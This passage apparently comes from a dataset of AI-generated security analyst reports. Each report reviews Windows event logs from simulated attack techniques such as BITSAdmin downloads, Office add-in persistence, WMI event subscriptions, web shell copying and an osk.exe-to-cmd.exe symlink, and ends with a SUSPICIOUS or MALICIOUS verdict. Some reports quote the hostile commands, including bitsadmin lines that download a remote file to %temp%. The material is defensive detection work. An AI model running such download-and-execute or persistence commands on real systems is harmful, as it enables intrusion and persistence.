3. **Unusual Executables Execution:**
   - The Sysmon log entries indicate the use of `whoami.exe` and `hostname.exe`, which although benign by themselves, could be utilized to gather system information post-breach.
   - Multiple instances of `conhost.exe` and `wevtutil.exe` processes were observed. While common, if these commands were leveraged in conjunction with PowerShell or other scripts, they could indicate a nefarious purpose.

4. **Unexpected Remote Logins:**
   - The logon events show NTLM authentication from the IP address `fe80::e3b5:5371:12a8:9c77`, which matches the use from the workstation `DESKTOP-3HL5B2P`. If this machine or IP is not typically associated with administrative access to the server, it could be worth investigating.

Given the presence of privilege escalation, potential misuse of PowerShell to alter server configurations, and the combination of administrative tools typically associated with reconnaissance post-compromise (whoami, hostname), there is a strong indication of unauthorized activities.

### Assessment:

The evidence provided in the logs points towards **SUSPICIOUS** activity with several indicators suggestive of a potential compromise.

### Recommendations:

1. **Immediate Actions:**
   - Verify the legitimacy of the `admin_test` account and whether the privileges assigned were intentional and monitored.
   - Determine if the PowerShell commands executed relating to Exchange are part of routine administrative tasks, or if they were unauthorized.

     bitsadmin.exe /create fileBITS & bitsadmin.exe /addfile fileBITS https://raw.githubusercontent.com/file/file-file/master/files/data/data.md %temp%\bitsadmin3_flag.ps1 & bitsadmin.exe /setnotifycmdline fileBITS C:\Windows\system32\notepad.exe NULL & bitsadmin.exe /resume fileBITS & ping -n 5 127.0.0.1 >nul 2>&1 & bitsadmin.exe /complete fileBITS
     ```
   - The use of BITSAdmin to download files from an external URL and set a notification command line to execute Notepad is unusual. This is a common tactic used by adversaries for downloading payloads over HTTP and then executing them locally.

2. **Repeated Privileged Operations**: 
   - There are multiple entries involving the `admin_test` account performing operations with high integrity levels and privileges:
     - Several processes (e.g., `wevtutil.exe`, `conhost.exe`) are executed with high integrity, indicating possible administrative rights.
   - The presence of high-integrity operations and utilization of administrative tools in rapid succession is unusual for standard user operations and suggests privilege abuse or unauthorized activity.

3. **Network Connections and Host Manipulation**:
   - The `whoami.exe`, `hostname.exe`, and `ping.exe` executions appear benign individually but, in conjunction with other entries, might suggest reconnaissance activities.
  
4. **Time Manipulation Event**:
   - A time change event is logged, which could indicate an attempt to alter the system's time settings. This can be part of techniques used to cover up traces of attacks (e.g., hiding log timestamps).

**Assessment and Conclusion**:
The highlighted activities, especially the use of BITSAdmin to fetch and potentially execute external content, are strong indicators of malicious activity. These signify a potential compromise where the adversary may have used the CEO's machine to retrieve and execute a malicious payload. Additionally, the combination of high privilege operations and external connections points towards unauthorized access or exploitation attempts.

**Resolution**: The investigation concludes with a finding of **MALICIOUS** activity. Immediate actions should include:
- Isolating the affected machine from the network.

Windows MOFComp.exe Load MOF File,"### Analysis of Windows Event Logs:

#### Overview:
The EDR alert regarding the CEO machine is a critical event that requires a detailed investigation of the provided logs, which primarily consist of Sysmon, PowerShell, Application, and System logs. The focus is on identifying any indicators of malicious activity within process executions, unusual command-line arguments, or potential privilege escalations.

#### Sysmon Log Highlights:
1. **PowerShell Execution**: Multiple instances of `powershell.exe` are seen executing the `mofcomp.exe` with a file path `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.003\src\data.003.mof`. PowerShell scripts are often used in malicious activities for instance executing scripts in a stealthy form. The `.mof` file (Managed Object Format) involved in this execution is suspicious and can be used for event registration manipulation or persistence mechanisms.
   
2. **Wevtutil and Conhost Executions**: The frequent execution of `wevtutil.exe` and `conhost.exe` processes in rapid succession could potentially be indicative of an attempt to manipulate or clear event logs, although `conhost.exe` is common when console applications are executed, its association with other events should be noted.

3. **Microsoft Edge Update Executions**: A series of events involving `MicrosoftEdgeUpdate.exe` processes. While updates are common, any execution in unusual locations like `C:\Program Files (x86)\Microsoft\Temp` suggests tampering or misuse.

#### PowerShell Log Highlights:
- The `PowerShell` logs corroborate the execution of the script involving the `mofcomp.exe`, which is noteworthy due to its potential use in system configurations and manipulations during attacks.

#### Application Log Highlights:
- **WMI Event**: There's a peculiar WMI query error targeting the creation of a Notepad process. This can signal the existence of a WMI persistence mechanism or recon activities.

#### Security and System Log Highlights:
- Security and System logs were notably empty, which itself can be suspicious if records are expected under normal circumstances. This absence might indicate log tampering.

### Assessment:
The identified pattern involving PowerShell executions, usage of `mofcomp.exe`, frequent process execution associated with events manipulation tools like `wevtutil.exe`, and unexpected update-related activity from paths not typical for software updates, strongly suggest potentially malicious activity. Particularly, the use of PowerShell in a scripting context with modifications of the system configuration (e.g., MOF compilation) is indicative of more sophisticated attack techniques aiming at persistence or privilege escalation.

### Resolution: MALICIOUS
The evidence gathered from the logs shows a strong indication of malicious behavior. The usage of scripting and system tools, coupled with attempts to manipulate system operations and configurations, aligns with typical tactics, techniques, and procedures (TTPs) used by adversaries for covert activities and lateral movement.

These steps should aid in containing the identified threat and guide further remediation and recovery efforts."
Persistent Code Execution Via Word Add-in File (WLL),"Upon analysis of the provided logs, a number of activities and processes have been identified that warrant further investigation:

### Suspicious or Anomalous Behavior:
- **PowerShell Execution**: The logs indicate PowerShell is being executed with a script that manipulates Microsoft Word add-ins. The script attempts to determine the version of Microsoft Office, then copies a `.wll` file to the Word Startup directory and restarts the `WinWord` process. This is potentially suspicious as it can be an attempt to install a malicious add-in to execute malicious actions whenever Word starts.
  
    The command:
    ```bash
    Copy ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.006\\bin\\Addins\\wordwll_x64.wll"" ""$env:APPDATA\\Microsoft\\Word\\Startup\\notepad.wll""
    ```
    suggests creating persistence via an add-in which could be used to execute malicious code on startup.

- **Repetitive Use of wevtutil and conhost**: There is frequent use of `wevtutil.exe` and `conhost.exe` by the `admin_test` user in quick succession. Although these could be benign, the frequency and lack of detail in the command lines (e.g., parameters) may be indicative of log clearing or other nefarious activity.

- **EdgeUpdate Executions**: There are multiple Microsoft Edge Update processes executing from expected locations using `NT AUTHORITY\SYSTEM` indicating tasks related to updates. This batch of entries generally appears benign but warrants confirmation just in case these are being used to mask other actions.

- **Use of SYSTEM Privileges**: Several processes such as `MicrosoftEdgeUpdateComRegisterShell64.exe` and `sppsvc.exe` run with `System` level privileges. While their presence and exertion of privileges may generally be normal, correlating their activity with other suspicious events is recommended.

### Malicious Indicators:
- The PowerShell script and its subsequent actions are highly indicative of a potential compromise focusing on persistence through Microsoft Word. This exact mechanism fits a known vector where malicious actors leverage Office add-ins for sustained access or data gathering.

### Threats and Risks:
- The main identified threat is the potential insertion and execution of malicious code on document editing software (MS Word) which could lead to unauthorized access, information theft, or further distributed attacks within the organization.

### Recommendation:
1. **Resolution: MALICIOUS**
   The behaviors observed align with known malicious activities, particularly the manipulation of Office add-ins via PowerShell. This is a common vector used in targeted attacks.

2. **Actions:**
   - **Isolate the Affected Host**: Immediately isolate the machine to prevent lateral movement or data exfiltration.
   - **Retrieve and Analyze the `.wll` Files**: These files should be safe-extracted and analyzed in a controlled environment to understand their functionality.
   - **Review Recent Changes/Logs**: Look for unapproved changes in system, app logs, and user activity that might correspond to indicators of compromise.
   - **Implement Security Patches and Updates**: Ensure that all software on the CEO’s machine and across critical systems are up-to-date with security patches.
   - **User Education and Awareness**: Reinforce user training on recognizing suspicious behavior and potential phishing attempts which might have precipitated this incident. 

This case highlights the need for continued vigilance in monitoring and the implementation of advanced security measures to detect and respond to potentially malicious activities."
Web Shell Written to Disk,"Upon reviewing the provided Windows event logs, here's a detailed analysis focusing on potential indicators of malicious activity:

### Summary of Observations:

1. **Process Execution (Sysmon Events):**
   - Multiple Sysmon Event ID 1 (Process Creation) entries indicate the execution of various processes, including `powershell.exe`, `wevtutil.exe`, `conhost.exe`, `cmd.exe`, `xcopy.exe`, `whoami.exe`, and various instances of `MicrosoftEdgeUpdate.exe`. These processes executed within a short period of time may suggest some scripted activity or batch operations.
   - The `xcopy.exe` command executed (`xcopy /I /Y ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.003\\src"" C:\\inetpub\\wwwroot`) indicates an attempt to copy files to the `C:\\inetpub\\wwwroot` directory, which is typically associated with web server content. This could imply potential web shell deployment or website modifications if it wasn't expected behavior.

2. **Usage of System Utilities:**
   - `wevtutil.exe` is a utility used to manage event logs, often benign but could be used to clear logs to hide malicious activity. Its presence in multiple Sysmon event logs (`ProcessId` 6416, 7004, 5384, 4728, 4876) raises a red flag, especially if it was used in conjunction with modifications to event logs.
   - `cmd.exe` and `powershell.exe` can be benign, but given the periods they were executed and associated commands, they require additional scrutiny. Powershell was executed by a user `admin_test`, which warrants checking if this was legitimate administrative activity.

3. **Precise Timestamps:**
   - There is a notable clustering of events around `2024-10-26 20:44:45`, with quick succession. The high frequency of executions could indicate automated scripts or attack toolkit activity.
   - The use of high privileges (`NT AUTHORITY\\SYSTEM`) for processes may indicate either legitimate system operations or an attack that has gained elevated privileges.

4. **Microsoft Edge Update Executions:**
   - Multiple executions of `MicrosoftEdgeUpdate.exe` and related components within the directory `C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\`. This could be related to legitimate software updates, but overuse, especially temporary files execution (`MicrosoftEdgeUpdate.exe`), without a clear context might be suspicious.

5. **Data Integrity Levels:**
   - Processes like `cmd.exe` and others ran with 'High' integrity level, which suggests they required elevated permissions. This might indicate a real privilege elevation attempt if not part of a normal operational script or service.

### Assessment:

The logs contain a mix of legitimate and unusual activities. The primary concern is the repeated execution of tools like `xcopy` to a web server directory, `wevtutil` by a non-native system account (`SERVER002\\admin_test`), and various `MicrosoftEdgeUpdate.exe` instances, alongside usage of other elevated tools. These could indicate attempts at unauthorized data copying to a web server or malicious activities obfuscated by disabling logs.

**Resolution: SUSPICIOUS**

### Recommendations:

- **Immediate Investigation:**
  - Verify the legitimacy of the account `SERVER002\\admin_test`. Investigate whether it should execute such tasks.
  - Check whether the `xcopy` operation to `C:\\inetpub\\wwwroot` aligns with any expected deployment or configuration.

- **Environmental Check:**
  - Investigate recent update policies on Microsoft Edge for discrepancies. If possible, correlate with network activity logs to check outgoing connections during the update period.
  - Analyze server `Server002` for unauthorized web content, especially in `C:\\inetpub\\wwwroot`.

- **Security Practices:**
  - Review permissions and access controls on the affected system to ensure only authorized users can execute high-integrity level processes.
  - Implement monitoring measures to detect anomalies involving high-frequency executions and unauthorized account usage.

Further investigation is warranted to rule out potential malicious activities."
Persistence via WMI Event Subscription - ActiveScriptEventConsumer,"### Detailed Analysis:

Upon reviewing the provided logs, several events indicate potentially suspicious or malicious activity that warrants further investigation:

1. **PowerShell Events:**
   - Multiple PowerShell events (Event ID 600) are noted, with command-line arguments creating a WMI persistence mechanism using `ActiveScriptEventConsumer`. The script uses VBScript to run `notepad.exe` silently. 
   - The setup of a `__EventFilter` combined with `ActiveScriptEventConsumer` can be indicative of persistence mechanisms used by attackers to maintain access to a compromised system without detection.

2. **Sysmon Events:**
   - Execution of Sysmon (System Monitor) application crashes repeatedly (`APPCRASH` for Sysmon.exe) as indicated in the Application log. Crashes of this type, combined with other signs, could suggest tampering with security features or anomaly detection systems.
   - Frequent use of `wevtutil.exe` processes and `conhost.exe` suggests someone was generating or processing event logs. Multiple instances of `whoami.exe` could indicate privilege verification attempts.

3. **Security Events:**
   - Security Event ID 4624 and 4672 illustrate successful privileged logins with elevated privileges granted such as `SeDebugPrivilege` and others. This could suggest administrative functions being used potentially by an adversary who has gained access to privileged accounts.

4. **Other Observations:**
   - Frequent execution of `WerFaultSecure.exe` and processes involved with error reporting (from Sysmon logs) might indicate attempts to exploit or manage system faults, possibly connected to destabilizing Sysmon as observed in the application logs.
   - Multiple occurrences of the security-auditing-related Event ID 6281, suggesting potential anomalous operations (double-check DDLs like `aepic.dll`, `fcon.dll` for potential injection points or misuse).

### Assessment:

The activities observed in these logs, especially the use of PowerShell for persistence, repeated application crashes, and use of elevated privileges, are highly indicative of malicious actions potentially linked to a compromise. The behavior matches techniques often used by attackers for maintaining persistent access to a system in stealth.

### Resolution:

**MALICIOUS**

### Recommendations:

1. **Immediate Response:**
   - Initiate containment procedures on the affected host to isolate and prevent further damage or lateral movement by potential adversaries.
   - Revoke access credentials for accounts showing privilege escalation and review other accounts for similar activities.

2. **Forensic Analysis:**
   - Conduct a full forensic investigation to understand the extent of the compromise and identify data exfiltration or other malicious actions.
   - Preserve logs, memory captures, and forensic images for deeper analysis and evidence.

3. **System Hardening:**
   - Review and harden system configurations, emphasizing PowerShell logging, WMI filters, and monitoring of critical systems.
   - Update and patch all software and ensure security solutions like EDR, Sysmon configurations, and AV are current and sufficiently robust.

4. **Awareness and Training:**
   - Conduct training for staff on recognizing potential phishing and other attack vectors to aid in prevention of such compromises in the future.

5. **Review Third-party Access:**
   - Evaluate any third-party software recently installed or frequently used on the system for vulnerabilities or unwanted behaviors.

By taking these steps, the organization can mitigate immediate threats and strengthen its security posture against future attacks."
Persistent Code Execution Via Excel VBA Add-in File (XLAM),"After analyzing the provided Windows event logs, here is the detailed analysis and findings regarding suspicious or potentially malicious activity:

1. **Suspicious PowerShell Activity:**
   - There is a PowerShell command execution involving the copying of a file (`ExcelVBAaddin.xlam`) to the Microsoft Excel startup folder (`XLSTART`) with a rename to `notepad.xlam`, followed by an attempt to launch Excel. This behavior is suspicious as it involves:
     - The use of PowerShell for file manipulation within the AppData directory, commonly a place for malicious scripts and payloads.
     - Attempting to place a file in the Excel startup folder, which can be a technique for persistence or to execute malicious macros/add-ins automatically when Excel starts.
   - The command executed is: `""powershell.exe"" & {Copy \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.006\\bin\\Addins\\ExcelVBAaddin.xlam\"" \""$env:APPDATA\\Microsoft\\Excel\\XLSTART\\notepad.xlam\"" , Start-Process \""Excel\""}`.

2. **Error in PowerShell Execution:**
   - There was an error message indicating that the attempt to copy the file via the `CopyItem` operation failed due to a missing part of the path. This could indicate an unsuccessful attempt to perform a potentially malicious action.

3. **Use of Conhost and PowerShell:**
   - Multiple instances of `conhost.exe` are spawned alongside PowerShell processes. While `conhost.exe` is a legitimate Windows process, excessive or unusual invocation patterns can be indicative of hiding malicious scripts.

4. **Edge Update Activity:**
   - There are numerous logs related to Microsoft Edge Update processes and installations. While consistent with regular update behavior, the frequency and clustering of these events should be monitored for any deviations from typical operation. No direct evidence of malicious use is present in these logs, but they highlight a need for ensuring updates are from legitimate sources.

5. **High Integrity Level Processes:**
   - The use of a PowerShell process with a high integrity level is notable, especially paired with potentially suspicious command-line entries. This level of integrity can permit more impactful changes to the system if leveraged maliciously.

**Assessment and Conclusion:**
Given the nature of the PowerShell script and its activities, there is evidence to suggest potentially malicious intent, especially with an attempt to interact with system processes in a way that could allow unauthorized actions or persistence. While the observed activity failed (error in path), it represents a typical pattern of exploitation activity.

**Resolution: SUSPICIOUS**

**Recommendations:**
- Conduct a thorough investigation into the origin of the PowerShell script execution and users involved.
- Review similar scripts or actions executed on the system.
- Monitor the environment for additional unusual PowerShell activity or attempts to modify startup folders.
- Consider implementing Application Control policies to restrict unauthorized script execution.
- Verify the legitimacy of the Microsoft Edge Update processes to ensure they are sourced from trusted channels."
Google Chrome Load Unpacked Extension With Command Line,"After analyzing the provided Windows event logs, I have identified some activities that require further examination. Here's the detailed analysis:

### Observations:

1. **Repeated Execution of `wevtutil.exe` and `conhost.exe`:**
   - There are multiple instances of both `wevtutil.exe` and `conhost.exe` being executed in rapid succession by the user `SERVER002\\admin_test`. 
   - `wevtutil.exe` is a legitimate Windows utility for managing event logs, but its repeated invocation without clear context can indicate log tampering or reconnaissance activity.

2. **PowerShell Script Execution:**
   - A PowerShell script was executed that downloads and extracts a Chromium browser with an additional extension:
     - **Command Details:** The PowerShell command downloads a Chromium snapshot and a uBlock Origin Lite extension, then launches Chromium with the extension.
     - Executing code via PowerShell to download and execute binaries is a common technique for downloading malware or setting up a malicious environment.
   - Also, elements of the command (`Invoke-WebRequest`, `Expand-Archive`, `Start-Process`) suggest a potentially harmful script could be in place.

3. **Regular Microsoft Edge Updates:**
   - The logs show activity consistent with Microsoft Edge updates, which involve `MicrosoftEdgeUpdate.exe` and related installation and configuration executables.
   - These activities seem typical for a system where auto-updates are happening, but verification of file integrity would be recommended.

### Assessment:

Based on the identified activities, there are abnormal and potentially malicious behaviors present in these logs:
- The repetitive execution of `wevtutil.exe` combined with PowerShell executions indicates the possibility of someone attempting log tampering or using PowerShell for non-standard activities.
- The downloading and running of binary files and scripts, especially ones involving potentially unnecessary browser setups or extensions, could be indicative of an initial setup for malicious purposes, such as data exfiltration or other exploits.

### Guidance on Resolution:

- **Resolution:** **SUSPICIOUS**
- **Actions to Proceed:**
  - Conduct a deeper investigation into the user activity of `SERVER002\\admin_test` and the involved IP addresses related to the PowerShell web requests.
  - Validate the integrity and purpose of the downloaded Chromium snapshot and the extension, checking for any known malicious signatures.
  - Review historical PowerShell usage and execution policies on the system to understand if this behavior is common for this user or system.
  - If unauthorized activities or policies are detected, consider performing a full security audit of the host and any associated systems.
  - Quarantine the affected machine if further analysis reveals any confirmed compromises or if immediate containment is necessary."
Auto-start application on user logon,"In analyzing the provided Windows event logs for signs of potential compromise, several noteworthy activities and behavioral patterns need attention:

### Suspicious or Anomalous Behavior

1. **Kernel and Time Change Events:**
   - The logs contain multiple `Microsoft-Windows-Kernel-General` events (EventID: 1 and 24) indicating system time changes by the `svchost.exe` process. Such changes are typically legitimate when associated with time synchronization services. However, repeated, non-standard changes could denote manipulation for malicious purposes, such as altering timestamps to cover tracks.

2. **Repeated Use of `wevtutil.exe` and `conhost.exe`:**
   - The `Sysmon` logs show repeated execution of `wevtutil.exe` and `conhost.exe` by a user identified as `SERVER002\\admin_test`. These tools are often used for event log management and can be associated with activities aimed at clearing or altering logs, indicative of potential evasion tactics.

3. **Unusual Command Execution:**
   - There is evidence of an `cmd.exe` process executing registry manipulation commands related to `TERM` accessibility features, which often serve as an exploitation vector for persistence or privilege escalation.

4. **Registry Key Addition via `cmd.exe`:**
   - The specific command line involved in multiple `cmd.exe` executions aims to add entries to the registry that could configure and execute arbitrary commands through accessibility tools, which can be a method used to maintain persistence or escalate privileges.

5. **Frequent Execution of Microsoft Edge Update Processes:**
   - While the `MicrosoftEdgeUpdate.exe` and its associated components show various executions, the frequency and depth of execution paths, and sub-process engagement indicate standard updating activity, yet should be confirmed legitimate by cross-verification with update schedules and configurations.

### Assessment

The cumulative evidence suggests patterns indicative of suspicious activity—specifically the manipulation of registry keys associated with accessibility features and potential log tampering using `wevtutil.exe`. While these could be related to legitimate administrative tasks or system updates, their recurrence coupled with potential time manipulation flags these actions for further scrutiny.

### Resolution

**Resolution: SUSPICIOUS**

### Guidance on How to Proceed

- **Further Investigation:**
  - Review recent administrative activities conducted by `SERVER002\\admin_test` and confirm the user's tasks.
  - Verify the legitimacy of the time changes and review any associated global domain or application-level time synchronization settings.
  - Examine the security posture concerning registry key entries added under accessibility features for unauthorized or errant configurations.
  - Conduct behavioral analysis on event log management activities to differentiate between authorized administrative protocols and potential tampering.

- **Recommendations:**
  - Implement continuous monitoring of registry change events, especially those targeting accessibility settings.
  - Enhance logging and alert configurations for `wevtutil.exe` usage patterns to ensure visibility into potentially unauthorized log management activities.
  - Coordinate with IT operations to verify any scheduled software updates or maintenance activities that could explain the observed uses of Microsoft Edge Update processes. 

This assessment calls for heightened vigilance and deepened investigative measures to determine the context and legitimacy behind the identified activities."
Append malicious start-process cmdlet,"After reviewing the provided logs, here's the detailed analysis:

1. **PowerShell Logs:**
   - A PowerShell command has been observed running with arguments to modify the PowerShell profile to include a `Start-Process calc.exe` command. This behavior is highly unusual and suspicious as it indicates an attempt to persistently execute the calculator on PowerShell startup. This could be indicative of a practice known as ""persistence mechanism,"" which is often used in attacks to ensure that a particular action or script is executed whenever PowerShell is launched.

2. **Security Logs:**
   - Multiple `4672` events are logged, which indicates the granting of special privileges to the SYSTEM account. Although SYSTEM account-related activities are common for administration, they should be monitored for unusual behaviors. However, there's no specific red flag in these logs unless tied to other suspicious activities.
   - The `5379` and `4798` events could suggest activities related to querying or retrieving credentials, especially given the repeated nature related to the ""MicrosoftAccount:user=02txoixylodcstop"" without success (ReturnCode indicates failure). This suggests repeated attempts to retrieve credentials, which can be suspicious but needs further investigation or context.

3. **Sysmon Logs:**
   - The execution of PowerShell with atypical command lines to alter profiles (e.g., adding content related to starting processes) was noted, aligning with the PowerShell logs’ findings. This suggests an intentional operational change in how PowerShell operates, typically used in malfeasance to maintain persistence.
   - Execution of `calc.exe` was logged — although the calculation tool itself is not harmful, it's frequently used in testing or demonstration of code execution and persistence techniques.

4. **Application and System Logs:**
   - The logs related to `MicrosoftEdgeUpdate` and other system services (e.g., `svchost.exe`) generally align with typical system operations and updates. However, the presence of these logs does not directly relate to the suspicious PowerShell activities.

### Assessment Summary:
The event logs indicate suspicious activity particularly involving PowerShell. The modification of a user's PowerShell profile to execute a seemingly benign application like Calculator upon PowerShell startup is a major concern. Such actions are consistent with establishing persistence, which is often associated with malicious intent.

### Final Resolution:
- **SUSPICIOUS**: The logs contain suspicious activities that require further investigation. The PowerShell profile modification is an anomalous behavior suggesting an attempt at persistence and should be addressed immediately.

### Guidance on How to Proceed:
1. **Immediate Action:**
   - Investigate the modifications made to the PowerShell profile for the ""admin_test"" user.
   - Ensure no other unauthorized changes have occurred across user profiles or startup scripts.

2. **Behavior Monitoring:**
   - Continue to monitor the system for any additional modifications or execution of unauthorized scripts.
   - Check for other persistence mechanisms or related suspicious activities that may have occurred in parallel.

3. **Review and Remediation:**
   - Review privileged account activities and verify whether any accounts have been compromised.
   - Consider a thorough security audit to look for any unauthorized account activities or unauthorized software installations.

4. **User Awareness:**
   - Educate the users, specifically admin users, about the risk of scripts and unwanted modifications that could endanger the system's integrity.
"
Create a new user in PowerShell,"### Log Analysis:

1. **PowerShell Logs:**
   - The PowerShell command executed is `New-LocalUser -Name ""data.001_PowerShell"" -NoPassword`. This command creates a new local user account named ""data.001_PowerShell"" without setting a password. The execution of this command is highly unusual and can be considered suspicious, especially on a CEO's machine, as it could indicate unauthorized user creation for persistence.

2. **System Logs:**
   - The time zone and system time changes (`EventID 24` and `EventID 1`) are logged multiple times, indicating a potential attempt to manipulate system time. However, such changes are not uncommon and could be part of regular system activity or maintenance.

3. **Sysmon Logs:**
   - The execution of `powershell.exe` with commands to create a new user is consistent with the PowerShell logs and further confirms the suspicious activity.
   - There is a presence of several Microsoft Edge Update entries, which appear to be legitimate updates and not inherently suspicious. The process executions appear to be part of normal software update processes.
   - The creation of multiple services and registration tasks for Microsoft Edge Update is noted, but these align with standard update procedures for the application and do not raise immediate concerns.

4. **Security Logs:**
   - `EventID 4720` indicates the successful creation of a user account ""data.001_PowerShell"". This corroborates the PowerShell activity.
   - `EventID 4722` shows that the account ""data.001_PowerShell"" was enabled, confirming that the new account is now active.
   - Privilege assignment to the user ""admin_test"" (`EventID 4672`) with privileges like `SeDebugPrivilege` is observed. While this could be typical for an admin account, the combination with the above actions requires scrutiny.
   - No indication of admin approval or awareness of this user creation is evident from the logs, raising suspicion about its legitimacy.

### Assessment:
- The creation of a new user account using PowerShell without a password, executed on the machine belonging to the CEO, is a red flag for potential unauthorized access or persistence by a malicious actor. The absence of logging indicating authorized administrative action for this account creation suggests a breach.

### Resolution:
- **MALICIOUS**: Given the unauthorized user creation activity through PowerShell, this event is clearly malicious. Immediate action should be taken.

### Guidance:
1. **Containment:**
   - Immediately isolate the machine from the network to prevent any potential spread of malicious activities.
   
2. **Eradication and Recovery:**
   - Remove the unauthorized user ""data.001_PowerShell"" from the system.
   - Review and reset any potentially compromised passwords connected to this incident.
   - Verify the integrity of critical system files and configurations.
   
3. **Investigation:**
   - Conduct a thorough investigation to determine how the malicious actor gained access and executed these actions.
   - Check for any other indications of compromise or persistent threats on this and related systems.

4. **Prevention:**
   - Enhance monitoring and alerting on user creation and privilege escalation activities.
   - Implement stricter access controls and auditing measures on executive and critical assets.
   - Educate the involved personnel about recognizing and handling suspicious activities."
Bitsadmin Download (cmd),"**Analysis of Windows Event Logs**

Upon reviewing the provided logs, the goal is to detect any indicators of malicious activity, particularly focusing on unusual process executions, suspicious command-line arguments, privilege escalation, and other signs that may suggest a potential compromise. Below is a detailed analysis:

1. **Suspicious Command Execution:**
    - The log entry at `""UtcTime"":""2024-10-25 16:56:05.8306138""` shows `""cmd.exe""` executing a potentially nefarious command: 
      ```
      ""CommandLine"":""\""cmd.exe\"" /c bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/file/file-file/master/files/data/data.md %%temp%%\\bitsadmin1_flag.ps1""
      ```
      - **Analysis**: Using `bitsadmin.exe` to download a file from an external URL (specifically from Github) and saving it as `bitsadmin1_flag.ps1` in a temporary directory is suspicious. This behavior is often associated with malicious activity, as actors might use it to download additional scripts or malicious payloads onto a system.

2. **Process Execution Analysis:**
    - Throughout the logs, the processes `svchost.exe`, `wevtutil.exe`, `conhost.exe`, `cmd.exe`, `bitsadmin.exe`, and various Microsoft Edge Update processes are observed.
    - The execution of `wevtutil.exe` by `SERVER002\\admin_test`, as noted multiple times, can be benign in certain contexts but may also signify attempts to clear event logs or an indication of probing activities if not correlated to administrative activities.

3. **User and Permission Context:**
    - The logs show processes being executed under the user context `SERVER002\\admin_test` with high integrity levels, suggesting administrative privileges. If `admin_test` is not a typical administrative user, this could point to potential privilege escalation.

4. **Edge Update Services:**
    - The numerous Microsoft Edge Update executions are likely routine updates. However, they can be leveraged by malicious entities if they manage to manipulate the update process.

5. **Other Executions:**
    - Instances of `hostname.exe`, `whoami.exe`, and `wsmprovhost.exe` seem to reflect typical system information queries and management hosting operations, which are not immediately suspicious in themselves.

6. **Absence of Host Compromise Indicators:**
    - No explicit rootkits, clear-text credentials extraction, or direct system tampering indicators are evident within the currently reviewed logs.

**Assessment:**
Given the suspicious execution of the `bitsadmin.exe` command to download and potentially execute a script without additional context, there are indications that warrant further investigation.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
- **Immediate Action**: Quarantine the network connection of Server002 temporarily until more information is available.
- **Forensic Analysis**: Obtain the downloaded script `bitsadmin1_flag.ps1` for detailed examination. Check the file’s execution and any corresponding script actions.
- **Review Other Logs**: Gather additional logs such as detailed Windows PowerShell logs, network traffic captures, and endpoint security alerts related to file executions or modifications.
- **User Verification**: Verify if `SERVER002\\admin_test` is a legitimate user performing known administrative tasks or if the user account has been compromised.
- **Inspect Anomalies**: Review scheduled tasks, startup scripts, and any modifications to high-risk files or system registries.
- **Harden Security**: Ensure that the system is updated with all the latest security patches, and restrict the use of `bitsadmin.exe` and similar tools to authorized users only.
- **Educate Users on Security**: Train users on security best practices, especially recognizing phishing attempts that may have led to unauthorized downloads."
Office Application Startup - Outlook as a C2,"### Analysis

Upon reviewing the logs provided, several entries stand out and warrant further discussion.

#### 1. Time Synchronization
- **EventID 4616 (Security Log)**: This event indicates a time change on the system executed by `svchost.exe` under `LOCAL SERVICE`. Time changes can be benign, often related to time server synchronization, as corroborated by the System log events, where the time was altered by `svchost.exe`. In this context, the synchronization with a time server (`time.windows.com`) does not appear suspicious.

#### 2. Process Creation
- **Sysmon Events (IDs: 1, 5)**: 
  - The `hostname.exe`, `whoami.exe`, and `wevtutil.exe` executions, under the user `SERVER002\admin_test`, raise initial suspicion due to their potential use in recon or log tampering activities. 
  - However, they are common utilities used in typical system and administrative scripts. Without context for these executions, they are not immediately indicative of malicious activity.

#### 3. Anomalous Command Execution
- **Sysmon EventID 18373 (cmd.exe Execution)**:
  - The command `cmd.exe /c reg add ...` modifies the registry to change security settings in Outlook and creates a file in the Outlook directory. This action is highly suspicious as it attempts to modify application security settings and could represent an attempt to enable macros or introduce malicious scripts into Outlook.
  - The presence of `reg.exe` and `cmd.exe` used in conjunction with modifying sensitive registry entries and VbaProject files suggests possible malicious attempts to lower security settings, which align with phishing or macro-based attack methodologies.

#### 4. Use of `wsmprovhost.exe`
- The regular appearance of `wsmprovhost.exe` as a parent process for these executions suggests PowerShell or Windows Management Instrumentation (WMI) interactions since `wsmprovhost.exe` is often associated with remote management tasks. Its usage in conjunction with other suspicious activity (i.e., the registry settings change) could indicate an attack using these common administrative tools for lateral movement or persistence.

### Assessment and Resolution

- **Threats/Risks Identified**: The most concerning entries are the commands altering Outlook's registry settings, which could facilitate malicious macro loading or persistence through automated Outlook interactions or compromised VBA projects. These changes reduce security barrier settings, which is a common step in preparation for further exploitation.

- **Guidance and Next Steps**:
  - **Isolate the device**: Until more information is known or malicious activity is neutralized.
  - **Conduct deeper forensic analysis**: Inspect any files placed in `%APPDATA%\Microsoft\Outlook\`, examine the VBA project file for malicious scripts, and analyze network traffic for any abnormal communications.
  - **System and User Review**: Review user actions (`admin_test`) for anomalies and verify authorized administrative activities.

### Final Resolution
Based on the analysis, the best resolution would be:

- **MALICIOUS**: The modification of registry settings related to a crucial application like Outlook, aiming to reduce security controls, is highly indicative of malicious intent, likely part of a broader strategy to exploit or persist within the environment. Further investigation is strongly recommended to clarify the situation and remediate any system compromises."
Create Symbolic Link From osk.exe to cmd.exe,"**Detailed Analysis:**

1. **System Log:**
   - **Time Changes:** Numerous events are related to the Windows Time Service and Kernel Time Provider. These are normal system adjustments to keep time in sync. No anomalies are observed here.

2. **Sysmon Log:**
   - **Process Executions:**
     - Legitimate system processes like `HOSTNAME.EXE`, `conhost.exe`, and `whoami.exe` are being executed by the user `admin_test`. These processes themselves are typical and expected in certain administrative scenarios.
     - However, the command `cmd.exe /c IF NOT EXIST %windir%\System32\osk.exe.bak ...` raises concern. This command involves making a backup of `osk.exe`, granting `Administrators:F` permissions, deleting the original `osk.exe`, and creating a symbolic link from `osk.exe` to `cmd.exe`.
     - **Analysis of this behavior:** Such actions are indicative of potential privilege escalation or persistence mechanisms, possibly by abusing the on-screen keyboard executable (`osk.exe`) to run a command shell (`cmd.exe`) under privileged contexts.
